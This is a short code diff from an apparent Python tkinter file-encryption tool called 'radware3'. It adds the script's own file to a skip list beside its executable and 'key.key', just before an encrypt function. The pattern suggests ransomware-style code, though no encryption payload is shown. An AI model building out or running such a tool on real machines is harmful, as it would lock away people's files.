@@ -106,7 +106,7 @@ pw.pack(side=tk.LEFT, padx=(8, 4), ipady=4)
 
 
 # ── Encrypt / Decrypt ──────────────────────────────────
-SKIP = {"radware3.exe", "key.key"}
+SKIP = {"radware3.exe","radware3.py", "key.key"}
 
 def encrypt():
     # Guard: don't re-encrypt if key already exists
